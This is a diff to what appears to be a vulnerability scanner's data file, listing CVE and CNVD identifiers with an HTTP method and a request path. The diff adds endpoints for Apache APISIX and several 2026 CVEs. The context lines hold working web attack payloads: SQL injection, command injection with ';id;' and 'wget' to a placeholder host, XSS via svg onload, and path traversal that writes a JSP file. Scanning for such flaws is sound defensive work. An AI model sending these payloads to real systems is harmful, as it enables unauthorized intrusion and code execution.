@@ -15,6 +15,7 @@ cve-2020-10973	GET	/backupsettings.dat
 cve-2020-10987	POST	/goform/setUsbUnload
 cve-2020-12124	GET	/cgi-bin/live_api.cgi?page=x7k2q9&id=x7k2q9&ip=;id;
 cve-2020-12127	GET	/cgi-bin/ExportAllSettings.sh
+cve-2020-13945	POST	/apisix/admin/routes
 cve-2020-22208	GET	/plus/ajax_street.php?act=alphabet&x=11�%27%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,md5(x7k2q9),9%20from%20qs_admin%23
 cve-2020-22209	GET	/plus/ajax_common.php?act=hotword&query=aa%錦%27%20union%20select%201,md5(x7k2q9),3%23%27
 cve-2020-22210	GET	/plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5(x7k2q9),5,6,7,8,9%23
@@ -30,6 +31,8 @@ cve-2021-37305	GET	/jeecg-boot/sys/user/querySysUser?username=admin
 cve-2021-41460	POST	/delete_cart_goods.php
 cve-2021-42887	GET	/formLoginAuth.htm?authCode=1&userName=admin&goURL=&action=login
 cve-2021-44260	GET	/live_mfg.html
+cve-2021-45232	GET	/apisix/admin/migrate/export
+cve-2022-24112	POST	/apisix/batch-requests
 cve-2022-2486	GET	/cgi-bin/mesh.cgi?page=upgrade&key=;%27wget+http://x7k2q9;%27
 cve-2022-2488	GET	/cgi-bin/touchlist_sync.cgi?IP=;wget+http://x7k2q9;
 cve-2022-25082	GET	/cgi-bin/downloadFlile.cgi?payload=x7k2q9
@@ -71,7 +74,11 @@ cve-2025-2711	GET	/help/systop.jsp?langcode=1%22%3E%3Csvg%20onload=alert(documen
 cve-2025-2712	GET	/help/top.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
 cve-2025-34038	GET	/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id
 cve-2025-34040	POST	/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/x7k2q9.jsp&fileId=2
+cve-2026-27944	GET	/api/backup
 cve-2026-29014	POST	/app/system/entrance.php?n=include&m=module&c=weixin&a=doapi
+cve-2026-33032	POST	/mcp_message
+cve-2026-42221	GET	/api/install
+cve-2026-42221-2	POST	/api/install
 cnvd-2017-06001	GET	/portal/attachment_clearTempFile.action?bean.RecId=1') AND EXTRACTVALUE(534543,CONCAT(0x5c,md5(x7k2q9),0x5c)) AND ('n72Yk'='n72Yk&bean.TabName=1
 cnvd-2017-06001-2	GET	/portal/attachment_getAttList.action?bean.RecId=1') AND EXTRACTVALUE(534543,CONCAT(0x5c,md5(x7k2q9),0x5c)) AND ('n72Yk'='n72Yk&bean.TabName=1
 cnvd-2018-13393	GET	/include/thumb.php?dir=http\..\admin\login\login_check.php
